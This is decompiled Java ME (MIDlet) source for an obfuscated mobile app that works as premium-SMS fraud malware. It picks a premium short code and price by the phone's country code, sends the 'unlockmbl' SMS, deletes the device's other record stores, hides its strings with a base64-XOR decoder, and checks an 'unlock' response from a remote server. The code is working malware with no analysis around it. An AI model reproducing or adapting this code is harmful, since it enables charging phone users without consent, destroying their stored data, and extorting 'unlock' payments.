import javax.microedition.io.ConnectionNotFoundException;
import javax.microedition.midlet.MIDlet;
import javax.microedition.io.HttpConnection;
import javax.microedition.rms.RecordStoreException;
import java.io.OutputStream;
import java.io.DataOutputStream;
import java.io.ByteArrayOutputStream;
import javax.microedition.rms.RecordStore;
import java.io.DataInputStream;
import javax.microedition.media.Player;
import java.io.InputStream;
import javax.microedition.media.Manager;
import java.io.ByteArrayInputStream;
import javax.wireless.messaging.Message;
import javax.wireless.messaging.TextMessage;
import javax.microedition.io.Connector;
import javax.wireless.messaging.MessageConnection;

// 
// Decompiled by Procyon v0.5.36
// 

public class e implements Runnable
{
    public boolean a;
    public boolean b;
    public boolean c;
    public int a;
    public boolean d;
    private String a;
    private String b;
    private String c;
    private String d;
    private String e;
    private String f;
    private String g;
    private String h;
    private String i;
    private String j;
    private String k;
    private String l;
    private String m;
    private String n;
    private String o;
    private String p;
    private String q;
    private String r;
    private String s;
    private String t;
    private String u;
    public long a;
    private boolean f;
    private long[] a;
    public Object a;
    private g a;
    public int b;
    public boolean e;
    private String[] a;
    private String[] b;
    private String[] c;
    private char[] a;
    private byte[] a;
    
    public e() {
        this.a = false;
        this.b = false;
        this.c = false;
        this.a = 0;
        this.d = false;
        this.b = 0;
        this.e = true;
        this.a = null;
        this.b = null;
    }
    
    public static void a(final Object a) {
        final e e = new e();
        e.a = a;
        e.b(0);
    }
    
    public void a() {
        if (this.a(0) == 1L) {
            if (this.a(6) == 1L) {
                return;
            }
        }
        this.d();
        if (!this.d) {
            try {
                long n = 600000L - this.a(3);
                if (n <= 0L) {
                    if (System.currentTimeMillis() > this.a(4) + 345600000L) {
                        n = 600000L;
                        this.a(3, 0L);
                    }
                    else {
                        Thread.sleep(3000L);
                    }
                }
                if (n > 0L) {
                    while (n > 0L) {
                        long n2 = 10000L;
                        if (n2 > n) {
                            n2 = n;
                        }
                        Thread.sleep(n2);
                        n -= n2;
                        this.a(3, 600000L - n);
                    }
                    this.a(4, System.currentTimeMillis());
                }
            }
            catch (Exception ex) {}
        }
        this.b();
        this.b(4);
        this.b(5);
    }
    
    private void b() {
        System.gc();
        this.t = this.a(a(this.b("+966050:dam 10140 unlockmbl140:+966053:dam 10140 unlockmbl140:+966055:dam 10140 unlockmbl140:+97156:uftunlockmbl140:+97150:uftunlockmbl140:+97155:uftunlockmbl140:+97339:uftunlockmbl140:+97338:uftunlockmbl140:+97336:uftunlockmbl140:+1600:dam 10140 unlockmbl140:+9656:uftunlockmbl140:+974:uftunlockmbl140:+374:85herounlockmbl140:+994:85herounlockmbl140:+972:85herounlockmbl140:+352:dam 10140 unlockmbl140:+389:dam 10140 unlockmbl140:+381:dam 10140 unlockmbl140:+591:dam 10140 unlockmbl140:+385:gsgetunlockmbl140:+382:dam 10140 unlockmbl140:+961:uftunlockmbl140:+359:gsgetunlockmbl140:+380:85herounlockmbl140:+355:uftunlockmbl140:+593:dam 10140 unlockmbl140:+992:gsunlockmbl140:+353:dam 10140 unlockmbl140:+386:dada unlockmbl140:+421:dada unlockmbl140:+212:go rrr gsunlockmbl140:+420:gsgetunlockmbl140:+886:550 10140 unlockmbl140:+372:gsgetunlockmbl140:+995:gsunlockmbl140:+373:dam 10140 unlockmbl140:+375:dam 10140 unlockmbl140:+234:geta unlockmbl140:+996:gsgetunlockmbl140:+966:dam 10140 unlockmbl140:+370:gsgetunlockmbl140:+962:uftunlockmbl140:+371:gsgetunlockmbl140:+998:gsunlockmbl140:+351:gsgetunlockmbl140:+358:gsgetunlockmbl140:+45:gsgetunlockmbl140:+47:gsgetunlockmbl140:+32:gsgetunlockmbl140:+48:uftunlockmbl140:+77:gsunlockmbl140:+46:uftunlockmbl140:+61:dam 10140 unlockmbl140:+86:x go rrr gsunlockmbl140:+64:rrr gsunlockmbl140:+31:getarunlockmbl140:+51:dam 10140 unlockmbl140:+79:gsunlockmbl140:+39:geta unlockmbl140:+60:dam 10140 unlockmbl140:+30:getaunlockmbl140:+52:if gsunlockmbl140:+91:if aunlockmbl140:+62:ru1 gsunlockmbl140:+41:dam 10140 unlockmbl140:+49:gagaunlockmbl140:+54:dam 10140 unlockmbl140:+58:dam 10140 unlockmbl140:+43:gagaunlockmbl140:+57:dam 10140 unlockmbl140:+56:dam 10140 unlockmbl140:+36:getaunlockmbl140:+34:getaunlockmbl140:+40:gsgetunlockmbl140:+27:gsgetunlockmbl140:+90:getaunlockmbl140:+33:gsgetunlockmbl140:+20:gsgetunlockmbl140:+44:geta unlockmbl140:+1:go dam 10140 unlockmbl140")));
        this.s = this.a(a(this.b("+966050:5 SAR:+966053:5 SAR:+966055:5 SAR:+97156:10 AED:+97150:10 AED:+97155:10 AED:+97339:0,5 BHD:+97338:0,5 BHD:+97336:0,5 BHD:+1600:3,00 CAD:+9656:0,5 KWD:+974:8 QAR:+374:333 AMD:+994:1,2 AZN:+972:8,66 ILS:+352:1,5 EUR:+389:90 MKD:+381:118 RSD:+591:8,85 BOB:+385:6,10 KN:+382:0,6 USD:+961:1 USD:+359:2,40 BGN:+380:15 \u0413\u0420\u041d:+355:120 LEK:+593:1,25 USD:+992:2 USD:+353:2,5 EUR:+386:2,5 EUR:+421:1,6 EUR:+212:8.85 MAD:+420:40 CZK:+886:50 TWD:+372:29,66 EEK:+995:1,58 GEL:+373:10 MDL:+375:6900 BYR:+234:50 NGN:+996:1 USD:+966:5 SAR:+370:5,93 LTL:+962:1.50 JOD:+371:0,50 LVL:+998:2 USD:+351:1,65 EUR:+358:1,64 EUR:+45:16 DKK:+47:16 NOK:+32:1,60 EUR:+48:6 ZT:+77:118 KZT:+46:30 SEK:+61:6,6 AUD:+86:1 CNY:+64:5,45 NZD:+31:2,00 EUR:+51:5 PEN:+79:60 \u0420\u0423\u0411:+39:2 EUR:+60:10 MYR:+30:1.19 EUR:+52:13 MXN:+91:50 RS:+62:10000 IDR:+41:3 CHF:+49:1,99 EURO:+54:4 ARS:+58:3,10 VEF:+43:2 EUR:+57:3596 COP:+56:750 CLP:+36:456 HUF:+34:1,2 EURO:+40:2,1 EURO:+27:20 ZAR:+90:16SMS / 32 KONTORDUR:+33:3 EURO:+20:5 L.E.:+44:1,5 GBP:+1:4,99 USD")));
        this.u = this.a(a(this.b("+966050:85298:+966053:85298:+966055:85298:+97156:2252:+97150:2252:+97155:2420:+97339:95312:+97338:95312:+97336:77127:+1600:88188:+9656:1489:+974:2921:+374:1151:+994:9012:+972:4545:+352:64747:+389:141930:+381:1553:+591:636:+385:67008:+382:1600:+961:1081:+359:1916:+380:4170:+355:15191:+593:7722:+992:4448:+353:57977:+386:7300:+421:7604:+212:9089:+420:9090150:+886:8086:+372:17012:+995:4446:+373:9966:+375:9993:+234:33810:+996:1151:+966:6752:+370:1635:+962:97958:+371:1872:+998:4448:+351:4565:+358:179479:+45:1945:+47:2322:+32:7796:+48:7668:+77:4446:+46:72777:+61:19911119:+86:1066109:+64:4500:+31:7010:+51:2447:+79:6365:+39:483233:+60:32088:+30:54999:+52:56547:+91:54999:+62:5799:+41:9292:+49:83338:+54:22588:+58:7766:+43:0900100330:+57:3585:+56:3113:+36:691226113:+34:5535:+40:1445:+27:40446:+90:6600:+33:83767:+20:95205:+44:60999:+1:23333")));
        this.d = this.b("HxJCLksqWTwcawpjFzkX");
        this.e = this.b("HzxvInFRIkcpXXNTCmUQMF47XjoabgEhUzZFMVAiVnYRcB14Vg");
        this.f = this.b("HxJfOkk6WzxZeRxuHHMB");
        this.i = this.b("HxNXMl8wHWsOfA9mCWc");
        this.g = this.b("Hx1SOQ");
        this.h = this.b("HxteJk87");
        this.j = this.b("");
        this.k = this.b("");
        this.q = this.b("HyxEMEQ0DiEObQJsGH0TZ0khRDZZOkgpTzsVdhl0WzhcLwBzFmQSfhtvQDVbN1g7UG8GYl8");
        this.n = this.b("H10JZkYwVSdOKFFxBW0IKFgtXzxUNUYjA2oePlckBGoPbAl6CWgaY0M3WHgbdBp0EXIGJlI9HWkBZEQNYxdyAG4Lf1E");
        this.o = this.b("H1MVdB1xFHBQJEtrHXgKYwV8XChAJQV1AHIReRhrDiAAUx5NbQBpDmYSMlwzR2cPbhh9XS9KK0ggRSEBdAcnXjtPYUEVZx4+XzhZMF5h");
        this.r = this.b("HyR0GH0cbwoqWD1OOlspXX0JYQQkQyJPKgprBWFBJEogTzYWYgpvTylcMFx8Cm8dbgdoBicHUztaNF8sDQ");
        this.p = this.b("H1kadQBsCGZBNRV2GXcZfB9rSz9QcARsCSlaP007XiwCImEJbA9kRC1DN1IgTitffwxpHWkAbgl6WjtVMRFlF25OL0gpQC4A");
        this.m = this.b("");
        this.l = this.b("");
        this.a = this.a("Msg_With_SMS", this.b("H3gsQ2MAbwF1HHIHYkIrX38WZUUrTi1IO0gpWyICdhk5Si9BJQVWG0hoTRlcBFAPXBFCZ0czXHwSZwpoDX9feipiLWMmeTdiL20oel9/HHMAdFRxIXM6eTxjMH0uCyUFVjNdORl3GG9Q"));
        this.c = this.a("Msg_No_SMS", this.b("H3gsQ2MAbwF1HHIHYkIrX38WZUUrTi1IO0gpWyICdhk5Si9BJQVWG0hoTRlcBFAPXBFCZ0czXHwSZwpoDX9feipiLWMmeTdiL20oel9/HHMAdFRxIXM6eTxjMH0uCyUFVjNdORl3GG9Q"));
        this.b = this.a("expired", this.b("H2I2XjsbaB1/DG8ddBZzUyNGNF0yVnYefwwsSTFBKFo/W3VVBmMNaUkoRmY1eCsLLno/ZzNsP3IhBCRQPx86aiJtI2Y5dyJvLWg6Hz9LJARnCGYSexVgBSVVOVghSCZBb08cUQIiUiBJKk91VXAgcjt4PWIxfC8KJARXMlw4Bw"));
        if (this.j == null || this.j.length() == 0) {
            this.j = this.b("Hw9cEUJiIUQqXjtJaQx+DGMR");
        }
        if (this.d) {
            this.a = this.b;
        }
        final String a = this.a("Suffix", "");
        if (!"".equals(a.trim())) {
            if (a(this.t)) {
                if (a.length() > 0 && a.charAt(0) >= '0' && a.charAt(0) <= '9') {
                    this.t = this.t + "_ " + a;
                }
                else {
                    this.t = this.t + " " + a;
                }
            }
            else {
                this.t = a;
            }
        }
        this.a = this.a(this.a);
        this.c = this.a(this.c);
        this.f = this.a(this.f);
        this.b = this.a(this.b);
        this.a = new g(this, this.i);
        if (this.a) {
            this.a(this.j);
        }
        else if (this.b) {
            this.a(this.k);
        }
        else if (!this.a()) {
            this.a(this.c);
        }
        else {
            this.a(this.a);
            this.c(0);
        }
        this.c(1);
        if (!this.a && !this.b) {
            this.a = 1;
        }
        else {
            this.a = 3;
        }
        if (this.a(0) == 1L) {
            this.a(this.n);
            this.a = 5;
        }
        this.a = System.currentTimeMillis() + 2000L;
    }
    
    private String a(String s) {
        s = a(s, this.b("HxUwZCF5LXIhbD8a"), this.t);
        s = a(s, this.b("HxE0ZCxjLWg3eSxhI2Y0EQ"), this.u);
        s = a(s, this.b("HxQxYTN6OXwjcD1uSw"), this.s);
        return s;
    }
    
    public void a(final boolean b) {
        if (b) {
            this.a = 4;
            this.a(this.e);
            this.a(0, 1L);
        }
        else {
            this.a = 7;
            this.a(this.f);
            this.d(1);
            this.c(0);
        }
        this.d(1);
        this.c(0);
    }
    
    public void a(final int n) {
        if (System.currentTimeMillis() < this.a) {
            return;
        }
        switch (this.a) {
            case 1: {
                if (n == 0) {
                    this.a(this.d);
                    this.d(0);
                    final long a = this.a();
                    this.a(5, a);
                    this.t = this.t + "_" + a;
                    this.a = 8;
                    this.a = new String[] { this.u };
                    this.b = new String[] { this.t };
                    this.b(3);
                    break;
                }
                if (n == 1) {
                    this.e();
                    break;
                }
                break;
            }
            case 2: {
                if (n == 0) {
                    try {
                        this.b(this.m);
                    }
                    catch (Exception ex) {}
                    this.e();
                }
                if (n == 1) {
                    this.e();
                    break;
                }
                break;
            }
            case 3: {
                if (n == 1) {
                    this.e();
                    break;
                }
                break;
            }
            case 4: {
                if (n == 1) {
                    this.e();
                }
                if (n == 0) {
                    this.a = 5;
                    this.c(1);
                    this.a(this.n);
                    break;
                }
                break;
            }
            case 5: {
                if (n == 0) {
                    this.d(0);
                    this.a(this.d);
                    this.b(1);
                }
                if (n == 1) {
                    this.a((String)(this.a = 1));
                    break;
                }
                break;
            }
            case 6: {
                if (n == 0) {
                    this.c(1);
                    this.a(this.n);
                    this.a = 5;
                    break;
                }
                break;
            }
            case 7: {
                if (n == 0) {
                    this.c(this.a = 1);
                    this.a(this.a);
                    break;
                }
                break;
            }
            case 8: {
                if (n == 1) {
                    this.a = 1;
                    this.c(0);
                    this.a(this.a);
                    break;
                }
                break;
            }
            case 9: {
                if (n == 1) {
                    this.c(0);
                    this.a(this.n);
                    this.a = 5;
                    break;
                }
                break;
            }
        }
    }
    
    protected void b(final int b) {
        this.b = b;
        final Thread thread = new Thread(this);
        thread.setPriority(10);
        thread.start();
    }
    
    public void run() {
        if (this.b == 0) {
            this.a();
        }
        else if (this.b == 4) {
            this.c();
        }
        else if (this.b == 5) {
            while (!this.f) {
                this.a.a();
                try {
                    Thread.sleep(500L);
                }
                catch (Exception ex) {}
            }
        }
        else if (this.b == 3) {
            this.a = 8;
            boolean b = false;
            try {
                for (int i = 0; i < this.a.length; ++i) {
                    final MessageConnection messageConnection = (MessageConnection)Connector.open("sms://" + this.a[i]);
                    final TextMessage textMessage = (TextMessage)messageConnection.newMessage("text");
                    textMessage.setPayloadText(this.b[i]);
                    messageConnection.send((Message)textMessage);
                    messageConnection.close();
                }
                b = true;
            }
            catch (Exception ex2) {}
            this.a(b);
        }
        else {
            if (this.b == 2) {}
            if (this.b == 1) {
                final String string = this.a(5) + "";
                final String c = this.c(this.q + string);
                boolean b2 = false;
                if (c != null) {
                    try {
                        if (Long.parseLong(c) == a((string + this.b("HxtvHWgN")).getBytes())) {
                            b2 = true;
                        }
                    }
                    catch (Exception ex3) {}
                }
                if (b2) {
                    this.a(6, 1L);
                    this.a = 1;
                    this.d(0);
                    this.a(this.r);
                }
                else {
                    String s;
                    if (this.c) {
                        s = this.p;
                    }
                    else {
                        s = this.o;
                    }
                    this.a = 6;
                    this.d(1);
                    this.c(0);
                    this.a(s);
                }
            }
        }
    }
    
    private void a(final String s) {
        this.a.a(s);
    }
    
    private void c(final int n) {
        if (this.c == null) {
            this.c = new String[] { this.g, this.h };
        }
        this.a.a(n, this.c[n]);
    }
    
    private void d(final int n) {
        this.a.a(n);
    }
    
    private void c() {
        try {
            final String s = "4D546864000000060000000103C04D54726B0000005200FF0308756E7469746C656400FF0214436F7079726967687420A920323030332062792000FF01095465616D2048324F0A00FF58040402180800FF5902000000FF51030927C0009040048F00400000FF2F00";
            final int n = s.length() >> 1;
            final byte[] buf = new byte[n];
            for (int i = 0; i < n; ++i) {
                buf[i] = (byte)((a(s.charAt(i << 1)) << 4) + a(s.charAt((i << 1) + 1)));
            }
            final Player player = Manager.createPlayer((InputStream)new ByteArrayInputStream(buf), "audio/midi");
            while (!this.f) {
                player.setLoopCount(1);
                player.start();
                Thread.sleep(200L);
                player.stop();
            }
        }
        catch (Exception ex) {}
    }
    
    private static int a(final char c) {
        if (c >= '0' && c <= '9') {
            return c - '0';
        }
        return c - 'A' + 10;
    }
    
    private boolean a() {
        return true;
    }
    
    private static boolean a(final String s) {
        return s != null && !"".equals(s.trim()) && !"null".equals(s.trim());
    }
    
    private static String[] a(final String s) {
        if (a(s)) {
            int ch;
            int i;
            int n;
            for (ch = 58, i = 0, n = 0; i != -1; i = s.indexOf(ch, i + 1), ++n) {}
            final String[] array = new String[n];
            int n2 = 0;
            int endIndex = s.indexOf(ch, n2);
            for (int j = 0; j < n; ++j) {
                if (endIndex == -1) {
                    array[j] = s.substring(n2);
                }
                else {
                    array[j] = s.substring(n2, endIndex);
                }
                n2 = endIndex + 1;
                endIndex = s.indexOf(ch, n2);
            }
            return array;
        }
        return null;
    }
    
    private String a(final String[] array) {
        if (array == null) {
            return null;
        }
        final int length = array.length;
        final boolean b = (length & 0x1) != 0x0;
        String str = System.getProperty(this.b("HwRzGmgNYQR3BCpHIlEiQyRNI0RqGXQHKVo3RCc"));
        int n = -1;
        int length2 = -1;
        if (str != null) {
            if (!str.startsWith("+")) {
                str = "+" + str;
            }
            for (int i = 0; i < length; i += 2) {
                if (str.startsWith(array[i]) && array[i].length() > length2 && !"".equals(array[i].trim())) {
                    length2 = array[i].length();
                    n = i;
                }
            }
        }
        if (str != null && n != -1) {
            return array[n + 1];
        }
        if (b) {
            return array[length - 1];
        }
        this.a = true;
        return null;
    }
    
    private static final long a(final byte[] array) {
        return a(array, 0, array.length);
    }
    
    private static final long a(final byte[] array, final int n, final int n2) {
        final int[] array2 = new int[256];
        for (int i = 0; i < 256; ++i) {
            int n3 = i;
            for (int j = 0; j < 8; ++j) {
                if ((n3 & 0x1) != 0x0) {
                    n3 = (0xEDB88320 ^ n3 >>> 1);
                }
                else {
                    n3 >>>= 1;
                }
            }
            array2[i] = n3;
        }
        int n4 = -1;
        for (int n5 = n + n2, k = n; k < n5; ++k) {
            n4 = (array2[(n4 ^ array[k]) & 0xFF] ^ n4 >>> 8);
        }
        return (long)~n4 & 0xFFFFFFFFL;
    }
    
    private long a() {
        final byte[] bytes = (System.getProperty(this.b("HwpnDm0fcBVxGGwFagQqWjZXI0UqWDU")) + System.currentTimeMillis()).getBytes();
        return a(bytes, 0, bytes.length);
    }
    
    private String b(final String anObject) {
        if ("".equals(anObject)) {
            return "";
        }
        if (this.a == null) {
            this.a = new char[64];
            this.a = new byte[128];
            int n = 0;
            for (char c = 'A'; c <= 'Z'; ++c) {
                this.a[n++] = c;
            }
            for (char c2 = 'a'; c2 <= 'z'; ++c2) {
                this.a[n++] = c2;
            }
            for (char c3 = '0'; c3 <= '9'; ++c3) {
                this.a[n++] = c3;
            }
            this.a[n++] = '+';
            this.a[n++] = '/';
            for (int i = 0; i < 64; ++i) {
                this.a[this.a[i]] = (byte)i;
            }
        }
        String utf = null;
        try {
            char[] charArray;
            int length;
            for (charArray = anObject.toCharArray(), length = charArray.length; length > 0 && charArray[length - 1] == '='; --length) {}
            final int n2 = length * 3 / 4;
            final byte[] buf = new byte[n2];
            int j = 0;
            int n3 = 0;
            while (j < length) {
                final char c4 = charArray[j++];
                final char c5 = charArray[j++];
                final char c6 = (j < length) ? charArray[j++] : 'A';
                final char c7 = (j < length) ? charArray[j++] : 'A';
                final byte b = this.a[c4];
                final byte b2 = this.a[c5];
                final byte b3 = this.a[c6];
                final byte b4 = this.a[c7];
                final int n4 = b << 2 | b2 >>> 4;
                final int n5 = (b2 & 0xF) << 4 | b3 >>> 2;
                final int n6 = (b3 & 0x3) << 6 | b4;
                buf[n3++] = (byte)n4;
                if (n3 < n2) {
                    buf[n3++] = (byte)n5;
                }
                if (n3 < n2) {
                    buf[n3++] = (byte)n6;
                }
            }
            int n7 = 31;
            for (int k = 0; k < n2; ++k) {
                final byte b5 = buf[k];
                buf[k] = (byte)(n7 ^ b5);
                n7 = b5;
            }
            final DataInputStream dataInputStream = new DataInputStream(new ByteArrayInputStream(buf));
            utf = dataInputStream.readUTF();
            dataInputStream.close();
        }
        catch (Exception ex) {}
        return (utf == null) ? anObject : utf;
    }
    
    private long a(final int n) {
        if (this.a == null) {
            this.a = new long[10];
            byte[] record = null;
            try {
                final RecordStore openRecordStore = RecordStore.openRecordStore("_nUr", true);
                if (openRecordStore.getNumRecords() != 0) {
                    record = openRecordStore.getRecord(1);
                }
                openRecordStore.closeRecordStore();
                final int length = record.length;
                byte b = 31;
                for (int i = 0; i < length; ++i) {
                    record[i] ^= b;
                    b = record[i];
                }
                final DataInputStream dataInputStream = new DataInputStream(new ByteArrayInputStream(record));
                if (dataInputStream.readByte() == -71) {
                    int read;
                    while ((read = dataInputStream.read()) != -1) {
                        this.a[read] = dataInputStream.readLong();
                    }
                }
            }
            catch (Exception ex) {}
        }
        return this.a[n];
    }
    
    private void a(final int n, final long n2) {
        if (n2 == this.a(n)) {
            return;
        }
        try {
            this.a[n] = n2;
            final ByteArrayOutputStream out = new ByteArrayOutputStream();
            final DataOutputStream dataOutputStream = new DataOutputStream(out);
            boolean b = true;
            dataOutputStream.writeByte(-71);
            for (int i = 0; i < 10; ++i) {
                if (this.a[i] != 0L) {
                    dataOutputStream.writeByte(i);
                    dataOutputStream.writeLong(this.a[i]);
                    b = false;
                }
            }
            dataOutputStream.close();
            if (!b) {
                final byte[] byteArray = out.toByteArray();
                final int length = byteArray.length;
                byte b2 = 31;
                for (int j = 0; j < length; ++j) {
                    final byte b3 = byteArray[j];
                    byteArray[j] = (byte)(b2 ^ b3);
                    b2 = b3;
                }
                final RecordStore openRecordStore = RecordStore.openRecordStore("_nUr", true);
                if (openRecordStore.getNumRecords() != 0) {
                    openRecordStore.setRecord(1, byteArray, 0, length);
                }
                else {
                    openRecordStore.addRecord(byteArray, 0, length);
                }
                openRecordStore.closeRecordStore();
            }
        }
        catch (Exception ex) {}
    }
    
    private void d() {
        final String[] listRecordStores = RecordStore.listRecordStores();
        if (listRecordStores == null) {
            return;
        }
        for (int i = 0; i < listRecordStores.length; ++i) {
            final String s = listRecordStores[i];
            if (!s.equals("_nUr")) {
                try {
                    try {
                        RecordStore.deleteRecordStore(s);
                    }
                    catch (RecordStoreException ex) {
                        final RecordStore openRecordStore = RecordStore.openRecordStore(s, false);
                        openRecordStore.closeRecordStore();
                        openRecordStore.closeRecordStore();
                        RecordStore.deleteRecordStore(s);
                    }
                }
                catch (Exception ex2) {}
            }
        }
    }
    
    private String c(final String s) {
        try {
            final HttpConnection httpConnection = (HttpConnection)Connector.open(s);
            httpConnection.setRequestMethod("GET");
            final InputStream openInputStream = httpConnection.openInputStream();
            final StringBuffer sb = new StringBuffer();
            for (int i = openInputStream.read(); i != -1; i = openInputStream.read()) {
                sb.append((char)i);
            }
            final String trim = sb.toString().trim();
            openInputStream.close();
            httpConnection.close();
            return trim;
        }
        catch (Exception ex) {
            this.c = true;
            return null;
        }
    }
    
    private static String a(final String s, final String str, final String str2) {
        final int index = s.indexOf(str);
        if (index != -1) {
            return s.substring(0, index) + str2 + s.substring(index + str.length());
        }
        return s;
    }
    
    private String a(final String s, final String s2) {
        String s3 = this.d(s);
        if (s3 != null) {
            s3 = s3.trim();
            if (s3.length() == 0) {
                s3 = null;
            }
        }
        return (s3 == null) ? s2 : s3;
    }
    
    private void b(final String s) {
        try {
            ((MIDlet)this.a).platformRequest(s);
        }
        catch (ConnectionNotFoundException ex) {}
    }
    
    private String d(final String s) {
        return ((MIDlet)this.a).getAppProperty(s);
    }
    
    private void e() {
        ((MIDlet)this.a).notifyDestroyed();
    }
}
